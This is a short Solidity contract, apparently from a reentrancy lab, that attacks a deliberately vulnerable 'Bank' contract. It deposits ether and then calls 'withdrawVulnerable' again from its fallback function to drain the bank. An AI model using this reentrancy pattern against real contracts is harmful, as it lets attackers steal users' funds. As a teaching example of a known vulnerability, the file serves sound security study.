// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Bank} from "misc/Reentrancy/Bank.sol";

contract BankAttacker {
    Bank bank;

    constructor() {}

    receive() external payable {}

    function setBank(address bank_) public {
        bank = Bank(bank_);
    }

    function attack() public payable {
        uint256 amount = msg.value;
        bank.deposit{value: amount}();
        bank.withdrawVulnerable(amount);
    }

    fallback() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdrawVulnerable(msg.value);
        }
    }
}
